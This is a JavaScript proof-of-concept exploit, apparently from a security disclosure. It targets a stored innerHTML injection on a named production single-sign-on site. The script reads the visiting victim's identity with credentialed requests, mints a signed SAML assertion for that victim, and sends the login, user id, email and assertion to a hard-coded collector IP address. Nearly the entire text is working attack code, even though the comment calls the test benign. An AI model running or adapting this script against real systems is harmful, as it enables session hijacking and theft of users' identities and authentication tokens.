// r22 PoC: attacker-authored JS, stored in the attacker's own Descope project, executed FIRST-PARTY
// on https://sso.pub.databricks.com through the /login/{projectId} enriched-text innerHTML sink.
// In ONE run it (1) reads the visiting victim's SSO identity, (2) mints a signed SAML assertion for
// that victim with an attacker-supplied samlIdpStateId, and (3) exfiltrates both to the attacker's
// server. Benign: our own test victim, our own listener, our own Descope project.
(async function(){
  var P='P2fI1vZEAVlmwTIExz7Aec6Y0lLV';            // Databricks prod Descope project (public SDK token)
  var OOB='http://130.61.131.112';                  // attacker collector
  var o={origin:(function(){try{return self.origin}catch(e){return '?'}})(),href:location.href};
  var st='';
  try{var h=((window.top||window.parent).location.hash)||'';var m=/st=([^&]+)/.exec(h);if(m)st=decodeURIComponent(m[1]);}catch(e){o.hashErr=String(e);}
  o.state_id=st;
  try{
    var r=await fetch('https://auth.sso.pub.databricks.com/v1/auth/me',
      {credentials:'include',headers:{'Authorization':'Bearer '+P}});
    o.me=r.status; var j=await r.json();
    o.login=(j.loginIds||[])[0]||''; o.uid=j.userId||''; o.email=j.email||'';
  }catch(e){o.meErr=String(e);}
  var saml='';
  try{
    var r2=await fetch('https://auth.sso.pub.databricks.com/v1/flow/start',
      {method:'POST',credentials:'include',
       headers:{'Authorization':'Bearer '+P,'Content-Type':'application/json'},
       body:JSON.stringify({flowId:'bevy-sign-up-and-sign-in',options:{samlIdpStateId:st,lastAuth:{}}})});
    o.flowstart=r2.status; var j2=await r2.json();
    saml=((j2.samlIdpResponse||{}).samlResponse)||'';
    o.assertion_len=saml.length; o.step=j2.stepName||((j2.screen||{}).id)||'';
  }catch(e){o.fsErr=String(e);}
  var u=OOB+'/r22-chain?victim='+encodeURIComponent(o.login||'none')
       +'&uid='+encodeURIComponent(o.uid||'')+'&alen='+(o.assertion_len||0)
       +'&meta='+encodeURIComponent(btoa(JSON.stringify(o)))
       +'&saml='+encodeURIComponent(saml);
  try{(window.top||window).location.href=u;}catch(e){location.href=u;}
})();
